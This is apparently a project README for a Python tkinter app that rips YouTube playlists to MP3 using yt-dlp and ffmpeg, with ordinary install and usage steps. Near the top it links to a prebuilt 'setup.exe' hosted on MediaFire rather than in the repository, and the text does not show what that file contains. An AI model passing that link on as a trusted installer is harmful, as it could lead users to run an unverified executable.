# YT Playlist Ripper 🎵
YT Playlist Ripper is a Python-based application that allows you to rip entire YouTube playlists and convert them to MP3 format. It uses yt-dl for downloading, ffmpeg for converting, and tkinter for a simple graphical user interface (GUI). Download installer [here](https://www.mediafire.com/file/iqgcb2vqw94shch/setup.exe/file)

## Features
* Download entire YouTube playlists or individual videos.
* Convert videos to high-quality MP3 format.
* Simple, intuitive GUI built with tkinter.
* Lightweight and easy to use.

## Requirements
Before running the program, ensure you have the following dependencies installed:

* Python 3.x - Download [here](https://www.python.org/downloads/)
* yt-dlp - A faster, more reliable fork of youtube-dl. Install via:
```
pip install yt-dlp
```
* ffmpeg - Used for audio conversion. [Installation instructions](https://ffmpeg.org/download.html)
* Tkinter - This comes pre-installed with most Python distributions. If not, install via:
```
sudo apt-get install python3-tk
```
or
```
pip install tk
```

## Installation
* Clone the repository:
```
git clone https://github.com/AbhashK1/YT-Playlist-Ripper.git
cd YT-Playlist-Ripper
```
* Install the necessary Python libraries:
```
pip install -r requirements.txt
```

## Usage
Launch the program by running:
```
python gui.py
```
Enter the YouTube playlist URL in the provided field.
Select the destination folder for the downloaded MP3 files.
Click Download to start ripping the playlist.

## How it Works
The application takes a YouTube playlist URL and downloads the videos using yt-dlp.
Once the videos are downloaded, it uses ffmpeg to extract and convert the audio tracks to MP3 format.
The tkinter GUI allows you to interact with the tool easily.

## Acknowledgments
* yt-dlp
* ffmpeg
